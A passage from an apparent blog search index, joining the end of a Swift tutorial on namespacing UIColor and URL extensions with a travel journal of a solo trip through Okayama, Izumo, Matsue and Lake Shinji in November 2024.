blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}After directly extending UIColor, the access method is as follows:let color = UIColor.bluecolor.toHexString() // #0000ffQuestionAs we add more custom extensions, the access interface can become cluttered, for example:let color = UIColor.bluecolor.getRed(...)color.getWhite(...)color.getHue(...)color.getCMYK() // Custom extension methodcolor.toHexString() // Custom extension methodcolor.withAlphaComponent(...)color.setFill(...)color.setToBlue() // Custom extension method// A Modulepublic extension UIColor { func getCMYK() { // ... }}// B Module// Invalid redeclaration of 'getCMYK()'public extension UIColor { func getCMYK() { // ... }}Our custom extensions and native methods are mixed together, making them hard to distinguish. Additionally, as the project grows and more packages are used, extension name conflicts may occur. For example, if two packages both add a getCMYK() method to the UIColor extension, it will cause issues.Custom Extension Namespace ContainerWe can use Swift Protocols, Computed Properties, and Generics features to encapsulate extension methods, giving them Namespace functionality.// Declare a generic container ExtensionContainer&lt;Base&gt;:public struct ExtensionContainer&lt;Base&gt; { public let base: Base public init(_ base: Base) { self.base = base }}// Define the interface for AnyObject, Class (Reference) Type implementations:// For example, NSXXX classes in Foundationpublic protocol ExtensionCompatibleObject: AnyObject {}// Define the interface for Struct (Value) Type implementations:public protocol ExtensionCompatible {}// Custom Namespace Computed Property:public extension ExtensionCompatibleObject { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}public extension ExtensionCompatible { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}Extending Native Typesextension UIColor: ExtensionCompatibleObject {}extension ExtensionContainer where Base: UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.base.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}Usagelet color = UIColor.bluecolor.zhg.toHexString() // #0000ffExample 2. URL .queryItems Extensionextension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { var queryParameters: [String: String]? { URLComponents(url: base, resolvingAgainstBaseURL: true)? .queryItems? .reduce(into: [String: String]()) { $0[$1.name] = $1.value } }}Combining with Builder PatternAdditionally, we can combine this packaging method with the Builder Pattern:final class URLBuilder { private var components: URLComponents init(base: URL) { self.components = URLComponents(url: base, resolvingAgainstBaseURL: true)! } func setQueryParameters(_ parameters: [String: String]) -&gt; URLBuilder { components.queryItems = parameters.map { .init(name: $0.key, value: $0.value) } return self } func setScheme(_ scheme: String) -&gt; URLBuilder { components.scheme = scheme return self } func build() -&gt; URL? { return components.url }}extension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { func builder() -&gt; URLBuilder { return URLBuilder(base: base) }}let url = URL(string: \"https://zhgchg.li\")!.zhg.builder().setQueryParameters([\"a\": \"b\", \"c\": \"d\"]).setScheme(\"ssh\").build()// ssh://zhgchg.li?a=b&amp;c=dIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "San'in & Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe", "url": "/posts/travel-journals/san-in-kansai-7-day-solo-trip-explore-izumo-matsue-tottori-himeji-osaka-kobe-aacd5f5cacd1/", "categories": "Travel Journals", "tags": "english, ai-translation, lifestyle, japan, travel-writing, shimane-prefecture, travel", "date": "2024-12-03 00:04:56 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 San‚Äôin Wide Area: Shimane, Izumo, Matsue, Tottori, Himeji, O...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 San‚Äôin Wide Area: Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo TripStarting from Okayama, first visit San‚Äôin region: Shimane Prefecture including Izumo and Matsue, then go to Tottori, and finally return to Himeji, Kansai, and Osaka; 7 days, 100,000 steps, covering over 1,000 kilometers of travel, exploring the San‚Äôin and Kansai areas in one trip.Sunset at Lake ShinjiPrefaceAt the very beginning, I planned to go to Sendai in the second half of 2024. However, after checking the attractions, I found my interest was just average at that time. Thinking back to the same week last year, from 11/13 to 11/18, I went on a ‚ÄúSanyo Area Hiroshima Okayama 6-Day Free Trip‚Äú and had a great impression of the Chugoku region, Sanyo, and Okayama ‚Äî beautiful scenery, convenient transportation, and fewer tourists. So, I decided to explore the San‚Äôin region (Shimane, Tottori) this time. Fortunately, I also had a break from work and needed to clear my mind, which led to this 7-day 6-night solo trip to the San‚Äôin area (plus Kansai region: Himeji, Osaka).Preparation WorkDate: 11/12‚Äì18This time, it was another spontaneous trip. In mid-October, I suddenly found a free slot and immediately planned to depart on 11/12 and return on 11/18.‚úàÔ∏è Flight TicketsThis year, I didn‚Äôt specifically rush to buy Tigerair‚Äôs autumn sale tickets. Last year, I got discounted tickets with better timing and lower prices ( Last year: Departure (11:10), Return (15:25), including 20KG checked baggage each way + seat selection + fees: NT$ 7,012 ). Departure: 13:05 TPE Taipei Taoyuan International Airport -&gt; 16:30 OKJ Okayama Momotaro Airport Return: 17:30 OKJ Okayama Momotaro Airport -&gt; 19:35 TPE Taipei Taoyuan International Airport Including round-trip 20KG checked baggage + seat selection + miscellaneous fees: NT$ 9,118 Not particularly cheap, but still acceptable. If you choose the same departure and return dates as last year, it will be more expensive, around NT$ 12,000.Tigerair 2025 New Direct Flight RoutesTigerair Taiwan will add a direct flight from Taoyuan International Airport to Tottori Yonago Airport starting Thursday, May 29, 2025, making it easier to visit the San‚Äôin region!üèùÔ∏èPlanI haven‚Äôt been to the San‚Äôin region or Himeji, so I will focus on these three places. 11/12 Arrive in Okayama in the evening and stay overnight to prepare for the trip to Shimane the next morning On the morning of 11/13, take the JR train to Shimane. First, visit Izumo Taisha and Inasa Beach. In the afternoon and evening, go to Lake Shinji to watch the sunset. 11/14 Morning: Matsue Castle and Matsue Horikawa Boat Tour, Afternoon: Adachi Museum of Art, Evening: Arrive in Tottori 11/15 Morning: Shirahige Shrine, Afternoon: Tottori Sand Dunes, Evening: Arrive at Himeji 11/16 Himeji Castle, Shopping in Himeji CityActually visited more: Shosha Mountain Engyo-ji Temple 11/17 Onaruto Bridge Promenade Uzunomichi, Naruto Whirlpools, Akashi Kaiky≈ç BridgeDue to bad weather, we didn‚Äôt go and instead went shopping and eating in Osaka and Kobe. 11/18 Shopping at Okayama Station, Return Trip üöÖ Travel - Japan JR PASSÔΩúKansai &amp; Sanin Area Rail PassÔΩúeMCO e-TicketThis time, it‚Äôs also a long-distance trip, so the JR Pass is a must. I initially worried there would only be the San‚Äôin and Sanyo JR Passes, but Japan JR thoughtfully planned all possible routes. The ‚ÄúKansai &amp; San‚Äôin Area Rail Pass JRPass‚Äù fits my needs perfectly!Kansai &amp; Sanin Area Rail Pass JRPass Coverage Price: NT$ 3,779 Includes an extra Sanin-Sanyo Area PASS 3-Day Ticket (great value when used together)üì±InternetThis time, I also purchased from KKday the ‚ÄúJapan eSIM CardÔΩúDaily High-Speed, Total, Unlimited Data PlanÔΩú65% Off‚Äù 7-Day Unlimited Data eSIM Plan Price: NT$ 847 In actual use, it works very well, is stable, and I haven‚Äôt encountered any throttling or disconnection issues. The eSIM activation method and precautions will be included in the article. Please continue reading.Japanese YenExchanged for new Japanese yen bills. It is recommended to bring both new and old bills, as some vending machines do not accept new bills.Vending Machine That Accepts New Banknotesüè† AccommodationThis time, I was lucky to only miss booking Toyoko Inn for one night in Matsue; all other nights were booked.11/12 Toyoko INN Okayama Station East Exit (One night)It takes 4 minutes to walk from Okayama Station. Non-smoking twin room, occupancy: 1 person Price: NT$ 1,616 11/13 Matsue Urban Hotel (One night)Exit Songjiang Station and walk for 2 minutes to arrive. Double Room with Small Double Bed ‚Äî Non-Smoking ‚Äî Building 2Occupancy: 1 person Price: NT$ 2,431 11/14 Toyoko INN Tottori Station South Exit (One night)It takes a 4-minute walk from Tottori Station exit. Non-smoking double room, occupancy: 1 person Price: NT$ 1,595 11/15 Toyoko INN Himeji Station Shinkansen North Exit (three nights)It takes a 5-minute walk from Himeji Station exit. Non-smoking double room, occupancy: 1 person Price: NT$ 6,055, NT$ 2,018 / night Although we managed to book Toyoko almost every time, the late booking meant only double rooms were left, so the price per night was higher. If we had booked a single room, the price could have been kept under NT$1,500 per night. However, based on past experience, even double rooms get fully booked as the date approaches, possibly because the location is less popular? The room unboxing video will be included in the article, please continue reading.‚Äî Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application‚Ä¶ These were mentioned in previous articles, so they won‚Äôt be repeated here. Visit Japan The only change from before is that the ‚ÄúImmigration Inspection‚Äù and ‚ÄúCustoms Declaration‚Äù QR codes have been combined into a single ‚ÄúImmigration and Customs Declaration QR Code,‚Äù with no difference between blue and yellow codes.Tigerair Online Self Check-inYou will receive a trip notification email from Tigerair 1 to 3 days before departure. Be sure! Be sure! Be sure! to complete the online ‚Äúself check-in‚Äù before departure:After clicking self check-in, you will be directed to the Tigerair website to confirm passenger information and baggage security. Finally, a boarding pass will be generated and sent.Keep your boarding pass safe. With it, you can go directly to the airport‚Äôs ‚ÄúSelf-Service Baggage Check-in‚Äù to drop off your luggage, avoiding long lines at the regular check-in counters.Let‚Äôs go! Departure!KKday Promotion üõí Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO E-ticket(Consider this if you only visit Matsue and the Tottori-Matsue area) Kansai &amp; Sanin Area Rail Pass JRPass(Best choice for arriving and departing from Okayama Airport) Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Japan JR PASSÔΩúSanyo &amp; Sanin Area Rail PassÔΩúeMCO E-Ticket(Explore the entire Sanyo and Sanin regions in one trip) Tottori Sand Dunes | Japan‚Äôs Only Thrilling Sandboarding Experience „ÄêTottori Bus One-Day Tour„ÄëTottori Sand Dunes, Uratomi Coast Cruise, Sand Museum, Pear Picking ExperienceÔΩúIncludes Special Lunch (From Osaka) Tottori Sand Dunes and Famous Izumo Taisha 2-Day Bus Tour (Departing from Osaka) New Year Visit! 3-Hour Stop at Izumo Taisha Shrine„ÄêFrom Hiroshima„Äë Day 1 (11/12 Tuesday) DepartureThe flight is at 1:05 PM. Woke up at 8 AM and left around 9 AM, plenty of time to spare.2024/11 Extracted from the Online Check-in Official WebsiteTigerair Online Check-in Service (Check in and drop luggage at the Airport MRT, then go straight to departure at the airport) is only available at Airport MRT A3 New Taipei Industrial Park Station; not at Taipei Main Station, so I took the direct Airport MRT train straight to Terminal 1.~= 10:00 Arrive at the airportArrived at the airport around 10:00, but the counter opens only at 10:20.~= 10:20 Queue for ‚ÄúSelf-Service Baggage Check-in‚Äù to drop off luggageOutbound: 9 KGAt this point, the advantage of using online check-in on the Tigerair website becomes clear. On the day, the regular check-in counters were already crowded by 10:20, with long lines estimated to take at least 45 minutes to an hour. The self-service baggage drop, however, took less than 15 minutes to complete, saving a lot of waiting time. Completing online check-in on-site and then lining up for ‚Äúself-service baggage drop‚Äù is much faster than queuing for ‚Äúregular check-in.‚Äù~= 10:50 Completed exit proceduresThis time at Terminal 1, Gate A1. (Finally, no more shuttle buses needed)Every time I came to Terminal 1 before, I always ate at Ding Gua Gua. This time, I switched to Lao Dong Beef Noodles, which is conveniently located near Gate A1.~= 11:30 Waiting at the gateAfter eating, I wandered around until about 11:30. The downside of Gate A1 is that it is far from the Terminal 1 Free Lounge. Too lazy to walk back and forth, I went straight to the waiting area.Before handling two network issues, the first is that my Chunghwa Telecom roaming function is turned off, so I cannot directly purchase a roaming plan if needed; therefore, I first called Chunghwa Telecom to unlock the roaming function as a precaution.You need to call Chunghwa Telecom, verify your personal information, and ask the customer service to unlock the account.Enable eSIM in Advance (Using iPhone as an Example)The second network issue is activating the eSIM at the airport first. Since activating the eSIM requires an internet connection, and the WiFi at Okayama Airport might be unstable, the Japanese eSIM was activated in advance while the internet in Taiwan was stable. If you are still worried about internet issues causing entry problems, you can also take a screenshot of the entry QR Code or fill out a paper entry card simultaneously for double protection.Previously, the eSIM bought in Thailand could be added automatically by long-pressing the QR Code in the purchase confirmation email, PDF, or screenshot and tapping ‚ÄúAdd eSIM‚Äù, but this time the Japan eSIM did not show that option:Found a method provided by a user that can successfully show the ‚ÄúAdd eSIM‚Äù option. (Seems to be an iOS bug, broken after iOS 17.4): Go to the eSIM certificate email or PDF, take a screenshot on your phone, and save the screenshot to your photo album. Open the phone camera and tap the bottom left corner to enter the album. Find the eSIM photo in the album, long press the QR code to see the ‚ÄúAdd eSIM‚Äù option. Click ‚ÄúAdd eSIM‚Äù to directly input activation information and activate the eSIM Manually Enable eSIM on iPhoneGo to ‚ÄúSettings‚Äù -&gt; ‚ÄúCellular‚Äù -&gt; ‚ÄúAdd eSIM‚Äù -&gt; ‚ÄúUse QR Code‚Äù:I printed out the eSIM QR code, so I activated it by scanning directly from there.If you have nothing, you can click ‚ÄúManually Enter Details‚Äù to copy and paste the eSIM certificate information for manual activation:Fill in the email content with SM-DP+ Address, Activation Code, and Confirmation Code (none this time), then click Next to complete activation.After inputting, it takes some time to activate. It may get stuck on ‚ÄúActivating‚Ä¶‚Äù for a while or show an activation failure message like ‚ÄúTry again later.‚Äù Just wait a bit longer. Once activated, ‚ÄúSettings‚Äù -&gt; ‚ÄúCellular‚Äù will show ‚ÄúOn,‚Äù and the signal icon in the top right will display signal bars below it. The action plan tag can be set to ‚ÄúTravel‚Äù We are still in Taiwan and cannot connect to the eSIM Japan network yet. Just make sure the activation is successful.~= 12:20 Boarding begins, no delay~= 13:05 On-time DepartureAt this time, heavy rain began in Taiwan, but there was little wind, so it did not significantly affect the takeoff.I find Tigerair‚Äôs seat comfort to be excellent among low-cost carriers (compared to Peach‚Äôs seats being too small and VietJet‚Äôs seats being uncomfortable). However, a downside of Tigerair is the ban on bringing your own food, so make sure you‚Äôre not hungry before the flight!No WiFi on the plane, can only listen to music and play offline games.You can see from the window that the weather in Japan is very nice. üëçüëçüëç16:30 (15:30 Taiwan Time) On-time LandingAfter landing in Japan, our Japan eSIM should be able to receive a signal. Signal is available but you still can‚Äôt access the internet. Go to ‚ÄúSettings‚Äù -&gt; ‚ÄúCellular‚Äù -&gt; select Travel Japan eSIM -&gt; make sure ‚ÄúEnable this line‚Äù is on and turn on ‚ÄúData Roaming‚Äù to get internet access! ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è You can also enter the main Chunghwa Telecom number. If you haven‚Äôt purchased Chunghwa Telecom‚Äôs roaming plan, remember to turn off ‚ÄúData Roaming‚Äù here, but keep ‚ÄúEnable this number‚Äù on to continue receiving SMS from Taiwan! Please note: Do not answer calls randomly, receiving domestic calls abroad will also incur charges! ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è (Only receiving text messages is free)~= 17:00 Complete immigration and collect luggage Okayama Momotaro Airport is a very small airport, with only one international flight at a time (which is your flight). You go through immigration and pick up your luggage together with the other passengers, which is very quick.(This flight seems almost full, and it took about 30 minutes to get through.) The unexpected thing is that all the airport staff can speak Chinese. It might be because smaller airports are stricter. Solo travelers like me are often asked how many days they will stay and which places they will visit. Some are even required to show hotel reservations.(So if you‚Äôre traveling alone, prepare in advance.) Airport WiFi Okayama Airport offers free WiFi, but after connecting, you need to enter your email, check your inbox, and click the link to activate it for continuous use; if you only need Visit Japan, you can open the webpage and display the immigration QR code within 10 minutes of connection.~= 17:04 Take the bus from Okayama Airport to JR Okayama StationFor the latest schedule, please refer to the official website The airport is small. Just follow the path outside, and you‚Äôll find the bus to Okayama Station. Staff will guide you, so don‚Äôt worry about getting lost‚Äîjust hop on the bus. There are few flights, so besides the scheduled departure times, the bus also adds trips according to flight arrival times; no need to worry about being full‚Äîif full, another bus will be dispatched.(According to the schedule, you have to wait until 19:05 for a bus, but in reality, extra buses are added.) Show your passport before 2024/11/30 to ride for free; free shuttle service is held irregularly, it was not available last year. ~= 18:00 Arrive at JR Okayama StationEncountered some traffic congestion after work, arriving at Gangshan Station around 18:00. (30 minutes later than expected)JR Okayama Station: JR Pass Exchange &amp; Booking Train Tickets to Matsue for Tomorrow You can check the official website for stations where you can exchange the JR Pass. Not every station offers the exchange!(JR Okayama Station is available) At Okayama Station, find the ticket vending machines and line up at the green machine in the middle. This is the only one that can exchange JR Pass. Redemption Process:Prepare your passport and the purchased JR Pass voucher QR code. You can first select Traditional Chinese from the top right language option, then click the yellow button ‚ÄúQR„Ç≥„Éº„Éâ„ÅÆË™≠Âèñ„Çä (QR Code Scan)‚Äù at the bottom left to redeem. You can choose the start date ; the reserved seat time is also counted from the start date. ‚ö†Ô∏è (Like I choose to start tomorrow)Follow the steps to scan the JR Pass QR Code and passport to complete the exchange.JR Pass QR CodeRedemption Result:The above image uses last year‚Äôs JR Pass redemption as an example.After redemption, you will receive three tickets. The other two rectangular ones are instruction manuals and are not useful; the one marked PASS is the most important. You need this ticket to enter and exit the station, so keep it safe!Booking JR Reserved SeatsThis is very important. According to the information provided by the JR Pass Kansai &amp; Sanin Area Pass official website, the JR YAKUMO train to the Sanin region is all reserved seating with no non-reserved seats ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è (starting from March 16, 2024), and all seats must be reserved in advance. You should also be able to book online in advance. Previously, I booked the JR from Hakata to Yufuin online, just need to check. Traffic information on Google Maps is incomplete. Detailed schedules and train names can be found on the JR official website. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èJR Pass Reserved Seat Reservation Process: JR Pass Kansai &amp; Sanin Area Pass allows up to 6 machine reservations for reserved seats; beyond that, you must book at a manned counter. The number and limits vary by JR Pass region, so please check the official website for details. First, find the English names of the departure location and the destination JR station names, for example: OKAYAMA (Â≤°Â±±) -&gt; MATSUE (ÊùæÊ±ü) Please note it is the JR station English name, so to go to Fukuoka, type Hakata XD Step one: Select ‚ÄúTraditional Chinese‚Äù first. Step 2: Directly insert a ‚ÄúJR Pass ticket‚Äù(If traveling with multiple people who need to reserve seats together, you will be asked to insert them again in Step 4.) Follow the remaining steps as shown in the video below to complete the reservation: The video demonstrates the entire reservation process from Yasugi Station to Tottori Station as an example. (There was no one in line at the ticket machine, so I dared to take out my phone and record the whole process)Reservation Completed: Due to the schedule and tomorrow‚Äôs itinerary, I booked the 07:05 train to Songjiang to drop off luggage at the hotel. Actual entry and exit still use the JR Pass (the one shown above) ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è, the reserved seat ticket only shows your car and seat number. No window seats left, only aisle seats QQ I casually bought a fried beef steak bento at Okayama Station and some food and drinks at a convenience store, then went to the hotel to rest. Okayama Station is under renovation, and I will return to Okayama on the last day of the trip.It takes five minutes to walk from Momotaro Shopping Street to the hotel.~= 19:00 Return to the hotel to eat and restThe bento portion was a bit small, but the Okayama white peach peach wine was very tasty! Along with the nostalgic Japanese convenience store (FamilyMart) hot dog and fried chicken, tonight was very satisfying. Good night, Okayama! Preparing well for an early start to the Japan trip tomorrow.Okayama Korakuen Light-UpThe 2024 light-up event at Okayama Korakuen Garden is from Friday, November 15 to Sunday, November 24. It wasn‚Äôt on the day I visited; if the lights are on, it‚Äôs worth seeing as it‚Äôs very beautiful.Photos I took at the Sanyo Mail Lighting Event in 2023Day 2 (11/13 Wednesday) Shimane ‚Äî Izumo Taisha, Sunset at Lake Shinji07:05 Take the Yakumo „ÇÑ„Åè„ÇÇ train No. 1 to MatsueThe car interior is quite comfortable, with luggage areas in the front and back for direct storage. The seats also have charging ports.The total journey takes about 2 hours and 45 minutes. You can feel the ride passing through mountains and ridges. Early in the morning, many areas are still shrouded in mist, giving a sense of entering a hidden paradise through mountain tunnels. Unfortunately, I didn‚Äôt get a window seat, so I could only watch the scenery from afar.09:49 Arrive at SongjiangThe weather in Matsue is fantastic ‚òÄÔ∏è. After arriving at Matsue Station, I headed straight to the hotel for tonight‚Äôs stay, Matsue Urban Hotel, to drop off my luggage.After dropping off the luggage, return to Songjiang Station around 10:00 and rebook a seat for Yakumo No. 3 departing from Songjiang to Izumo City at 10:48. I should have booked the seat yesterday for Okayama to Matsue and also booked another seat from Matsue to Izumo City because I wanted to watch the sunset in the afternoon, so I left my luggage in Matsue first. Otherwise, I would have gone straight to Izumo City to avoid wasting time changing trains. You can also take the Ichibata Electric Railway Taisha Line to Izumo Taisha, which takes about the same time.There was still some time, so I went to the convenience store to buy two rice balls, coffee, and fried chicken to take as lunch.Along the way, you will pass Lake Shinjiko, which is so vast that at first, you might think it‚Äôs the sea, but it‚Äôs actually a lake. You need to book a window seat on side D to directly see Lake Shikotsu. I booked side A by the mountain and can‚Äôt see it QQ.11:12 Arrive at Izumo CityAfter arriving at Matsue Station, I ran all the way to catch the 11:25 Ichibata Electric Railway North Matsue Line heading to Kawato Station. Ichibata Electric Railway does not accept transit cards for entry. You must first buy a ticket at the automatic ticket machine near the entrance (electronic payment accepted). If you‚Äôre unsure how to buy, just tell the staff you want to go to Izumo Taisha.At Kawaji Station, you need to transfer trains (follow everyone to the opposite platform) to take the Ichibata Electric Railway Taisha Line toward Izumo Taisha-mae Station.Arrive at Izumo Taisha around 12 o‚ÄôclockThe Omotesando in front of the shrine is serene and beautiful. If you have time, there are many small shops and delicious foods to explore here. Later, I learned that the four torii gates of Izumo are also famous. One of the large white torii gates can be found at the entrance by walking from Izumo Station‚Äôs Omotesando in the opposite direction of the shrine:Source: Shimane Tourism Official Website For more details, please refer to the Shimane Tourism Official WebsiteWalk up to the entrance of Izumo Taisha. The visit date, 2024/11/13, coincides with the Kamiari Festival period (2024 Reiwa 6 Year 11/11~11/17), so many Japanese visitors come to pray. Every year in Japan, during the lunar October (November in the Gregorian calendar), eight million gods gather in Izumo for the ‚ÄúDivine Council‚Äù to discuss human affairs, such as fate arrangements and harmony with nature. Therefore, this month is called ‚ÄúKannazuki‚Äù (the month without gods) in other regions of Japan and mostly has no festivals. In Izumo, this is called the ‚ÄúMonth of the Gods,‚Äù meaning only the Izumo region has the gods. The festival includes the ‚ÄúKami-mukae Festival‚Äù to welcome the gods, the ‚ÄúEnmusubi Grand Festival‚Äù to pray for good relationships, and the ‚ÄúKami-okuri Festival‚Äù to send off the gods Izumo Taisha Main Deity: ≈åkuninushi no MikotoWhat a coincidence! When I was scheduling the time, I didn‚Äôt intentionally choose this slot. I only found out when I was looking up information about the attraction.After passing through the entrance torii gate, it takes about another 5 minutes to reach the shrine.Japan‚Äôs Largest ‚ÄúHinomaru‚Äù National FlagAfter entering the shrine, look to the left to see a tall flagpole with Japan‚Äôs largest Hinomaru flag (about 75 tatami mats, 137 square meters).Walk towards this flagpole to reach the ‚ÄúKaguraden,‚Äù where you can find Japan‚Äôs largest Shimenawa.Up close, it is truly huge, especially compared to the typical shimenawa at other shrines, about 10 times larger. (Length: 14 meters, weight: 5 tons, replaced every few years, handmade) Please remember that the largest one is at the ‚ÄúKaguraden,‚Äù not the main hall as I initially thought.After walking around, there were quite a few people, and some had to wait in long lines to pray. The way to worship at Izumo Taisha is different from other shrines: ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è It is to bow twice, clap four times, and then bow once more.Bought the limited-edition protective charm from the God Festival. (Only sold for one week)After the visit, I took a stamp collection book and stamped the Izumo Taisha commemorative seal.Locations of five major shrines for Izumo gods and Tsukuyomi gods pilgrimage.Due to limited time, I didn‚Äôt visit other shrines in Izumo. Without driving, it also felt difficult to explore them.~= 12:45 Walk to Inasa Beach Inasa no HamaThe bus runs infrequently, so you have to walk, which takes about 15 minutes. Along the way, you‚Äôll pass the grave of Izumo Okuni. Walking all the way leads you to Inasa Beach. Inasahama:Source: Shimane Tourism Official Website A site deeply rooted in Japanese mythology, the small island in the picture is called Benten Island, which has a small shrine. One of Japan‚Äôs top 100 beaches, ‚ÄúSunset Sacred Site Izumo,‚Äù offers a stunning view of the sun setting behind Benten Island into the sea. It is designated as a Japan Heritage site and hosts the Kami-mukae ceremony, welcoming deities from across Japan.Due to limited visiting time, I couldn‚Äôt stay until sunset and left after a brief walk. Back in Taiwan, I scrolled through IG and found out that you can get a Sand Amulet here Ôºöhttps://www.instagram.com/reel/CynStXPyZAX/Walk back to the Izumo Taisha bus stop to take the bus back to JR Izumo Station.You can see a continuous line of vehicles waiting to enter the Izumo Taisha parking lot for worship.Izumo Taisha bus stop is behind the souvenir shop, past the restroom. It‚Äôs small, so I was worried about waiting at the wrong place at first.It was about 13:15, and I had to wait until 13:40 for the bus back to JR Izumo Station. Feeling very hungry, I first went to the souvenir shop ahead and bought some snacks nearby to eat by hand.Bought a few ch≈´niby≈ç stickers at the souvenir shop.13:40 Take the bus back to JR Izumo Station On the way back to Izumo, a Japanese person asked to borrow my power bank because his phone was completely dead. I took the chance to confirm with him (and practice the few Japanese phrases I remember), ‚Äú „Åì„ÅÆ„Éê„Çπ„ÅØ JR Âá∫Èõ≤Â∏ÇÈßÖ„Å∏Ë°å„Åç„Åæ„Åô„Åã ‚Äú He replied, ‚Äú „ÅØ„ÅÑ ‚Äú (I only understood ‚Äúhai‚Äù).~= 14:15 Return to JR Izumoshi Station(Heading to see the sunset at Lake Shinji before it sets, according to information Sunset at 17:05 on that day)This time, I didn‚Äôt take the Yakumo train. I took the 14:54 local train to Yonago and followed Google Maps‚Äô suggestion to get off at Nogi Station and walk to the Shinjiko Sunset Viewing Spot. If you sit on the left side (A) towards Matsue, you can see the lake view passing by Lake Shinji. Yes, I sat on the wrong side again, the side closer to the mountains. At this station, the local train doors only open when you press a button. First time encountering this. ‚ö†Ô∏è~=15:35 Arrive at Nogi StationNogi Station is very small, with no station staff or ticket gates. If you are using a JR Pass, just exit the station directly. Do not foolishly leave your JR Pass in the ticket box. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èWalking from Nogi Station was a bit of a mistake; this area is quite deserted with few people around‚Ä¶Fortunately, there was a 7‚Äì11 along the way where we bought hot dogs, fried chicken, and drinks to enjoy while waiting for the sunset.16:00 Sunset at Lake Shinji Lake Shinji, the seventh largest lake in Japan, and the sunset at Lake Shinji, the best sunset in Japan. In the picture, the small island Yomejima Shrine has a white small torii gate. Previously mistyped as Acupoint Lake.There is an egret.Going up leads to the Shimane Prefectural Art Museum, which is livelier and has cafes; however, the stair platform offers a better scenic angle.16:45 Sunset in the WestAt first, I didn‚Äôt feel much, but as the sunset approached, I began to appreciate the charm of the first sunset. The egret earlier also blended perfectly with the scenery.After the sun approaches the horizon, time seems to pass visibly fast to the naked eye, with the sun descending every minute and second.Quickly, by 17:01, the sun was no longer visible. Truly beautiful and healing.Finally, take another look around the Sunset Viewing Stair Platform at the people watching the sunset together.After sunset, I turned around to wait for the bus, ready to head back to Songjiang.Sunset IndexSunset index can be referred to on the Shimane travel websiteShinjiko Lake Cruisehttps://hakuchougo.jp/timetable/There are sightseeing boats on Lake Shinji, which you can take near sunset to enjoy the view from the boat. I would like to try it next time I visit. You can directly use the San‚Äôin-Sanyo Area Pass 3-Day Ticket included with the JR Pass for free, saving 1,800 yen.18:00 Return to Songjiang Station and HotelBuy some souvenirs at the gift shop on the first floor of Songjiang StationI thought San‚Äôin is quite unique, so I‚Äôll buy souvenirs here.What‚Äôs special is the beef bone broth ramen, usually it‚Äôs pork bone broth. I bought a box to try back in Taiwan.Bought two big boxes of cookies (good for sharing with colleagues) to share with coworkers. The sweet ones are ordinary but are souvenirs from Izumo Taisha Shrine, while the salty seafood pancake cookies I found very tasty!Return to the hotelThis building has no elevator. The booking is for Building 2, which can be accessed from this building‚Äôs lobby via a skybridge. On the 2nd floor of Building 2, there is a lounge with a microwave, laundry room, and vending machines. The experience at Building 2 didn‚Äôt feel very safe. The elevator has no access control, and the 1st and 2nd floors are capsule hotels, making entry and exit more complicated. It‚Äôs also far from the main lobby, so after checking in, I used my suitcase to block the door, fearing someone strange might break in.In the lobby, you can get free face masks, coffee, and tea bags.ForagingAfter check-in, I went out to find food. It was quite cold, dark, and quiet outside. I quickly grabbed a takeout bento from a restaurant near the station and bought some snacks and drinks at a convenience store, then returned to the hotel.The beef tongue bento is delicious, and the peach sparkling wine bought at the convenience store is also tasty. Good night, Songjiang.Also bought almost the same next-day breakfast set every day‚Ä¶This pulp juice from FamilyMart is a must-drink every time I visit Japan!Matsue Shinji Lake 24-Hour Live Stream:A YouTube channel I stumbled upon that shows the weather and scenery of Lake Shinji.Day 3 (11/14 Thursday) Matsue Horikawa Sightseeing Boat, Matsue Castle, Adachi Museum of ArtEarly in the morning, first leave the 